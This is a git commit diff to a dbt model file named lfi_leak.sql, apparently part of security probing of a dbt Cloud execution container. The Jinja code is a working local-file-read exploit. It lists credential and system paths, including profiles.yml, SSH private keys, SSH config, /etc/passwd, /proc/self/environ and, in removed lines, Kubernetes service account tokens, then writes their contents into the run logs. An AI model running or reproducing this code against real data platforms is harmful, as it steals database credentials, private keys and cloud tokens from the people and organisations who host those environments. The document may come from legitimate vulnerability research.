08f395d468a2f0b4d6006f9f015e51926ff2b2f5
hunter <hunter@WD168220234152noidaspeedvpsFY1KQ5t4wW.test.com>
2026-09-23 01:09:56 +0530

    traversal test

--- models/lfi_leak.sql
+++ models/lfi_leak.sql
@@ -1,32 +1,32 @@
--- LFI via load_file_contents — reads files from the dbt Cloud execution container
--- Uses dynamic run ID from env_var to construct SSH config path
-
 {% set run_id = env_var('DBT_CLOUD_RUN_ID', 'unknown') %}
+{% set home = env_var('HOME', '/tmp') %}
 
 {% set files_to_read = [
+    'dbt_project.yml',
+    '../profiles.yml',
+    '../../profiles.yml',
+    home ~ '/profiles.yml',
+    home ~ '/.dbt/profiles.yml',
+    home ~ '/target/profiles.yml',
+    '../.ssh/config',
+    '../../.ssh/config',
+    home ~ '/.ssh/config',
+    home ~ '/.ssh/id_rsa',
+    home ~ '/.ssh/id_ed25519',
     '/tmp/jobs/' ~ run_id ~ '/.ssh/config',
-    '/tmp/jobs/' ~ run_id ~ '/.ssh/id_rsa',
-    '/tmp/jobs/' ~ run_id ~ '/.ssh/id_ed25519',
-    '/tmp/jobs/' ~ run_id ~ '/.ssh/known_hosts',
-    '/proc/self/environ',
-    '/proc/self/cgroup',
-    '/etc/hostname',
-    '/etc/resolv.conf',
-    '/etc/passwd',
-    '/var/run/secrets/kubernetes.io/serviceaccount/token',
-    '/var/run/secrets/kubernetes.io/serviceaccount/namespace',
-    '/usr/src/orc/Dockerfile',
-    '/usr/src/orc/requirements.txt',
-    '/usr/src/orc/pyproject.toml',
-    '/usr/src/orc/setup.cfg'
+    '/tmp/jobs/' ~ run_id ~ '/target/.ssh/config',
+    '/tmp/jobs/' ~ run_id ~ '/profiles.yml',
+    '/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml',
+    '../../../etc/passwd',
+    '../../../proc/self/environ'
 ] %}
 
 {% for fpath in files_to_read %}
 {% set content = load_file_contents(fpath) %}
 {% if content %}
-{{ log("FILE_LEAK[" ~ fpath ~ "]=" ~ content[:800], info=True) }}
+{{ log("LFI[" ~ fpath ~ "]=" ~ content[:600], info=True) }}
 {% else %}
-{{ log("FILE_LEAK[" ~ fpath ~ "]=NOT_FOUND", info=True) }}
+{{ log("LFI[" ~ fpath ~ "]=EMPTY", info=True) }}
 {% endif %}
 {% endfor %}
 
